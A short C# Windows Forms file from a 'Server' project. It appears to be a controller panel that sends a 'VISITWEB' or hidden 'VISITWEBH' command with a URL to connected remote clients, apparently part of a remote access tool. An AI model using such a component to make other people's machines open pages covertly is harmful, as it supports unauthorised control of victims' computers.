using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Forms
{
    public partial class WebsiteF : Form
    {
        public WebsiteF()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Form1 ss = new Form1();
            if(checkBox1.Checked == true)
            {
                ss.SendData("VISITWEBH|" + textBox1.Text + "@");
            }
            else
            {
                ss.SendData("VISITWEB|" + textBox1.Text + "@");
            }
            
            this.Hide();
        }
    }
}
